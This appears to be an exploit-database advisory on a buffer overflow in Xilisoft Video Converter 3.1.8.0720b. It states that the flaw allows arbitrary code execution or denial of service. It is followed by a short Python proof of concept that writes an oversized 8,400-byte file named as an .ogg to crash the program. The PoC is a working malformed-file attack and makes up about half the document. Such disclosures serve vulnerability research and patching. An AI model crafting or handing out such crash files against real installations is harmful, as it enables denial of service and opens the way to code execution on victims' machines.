source: http://www.securityfocus.com/bid/42473/info

Xilisoft Video Converter is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

Xilisoft Video Converter 3.1.8.0720b is vulnerable; other versions may also be affected. 

################PoC Start##############################################
print "\nXilisoft Video Converter Wizard 3 ogg file processing DoS"

#Download from
# http://www.downloadatoz.com/xilisoft-video-converter/order.php?download=xilisoft-video-converter&url=downloadatoz.com/xilisoft-video-converter/wizard.html/__xilisoft-video-converter__d1
#http://www.downloadatoz.com/xilisoft-video-converter/wizard.html

buff = "D" * 8400

try:
    oggfile = open("XilVC_ogg_crash.ogg","w")
    oggfile.write(buff)
    oggfile.close()
    print "[+]Successfully created ogg file\n"
    print "[+]Coded by Praveen Darshanam\n"
except:
    print "[+]Cannot create File\n"

################PoC End################################################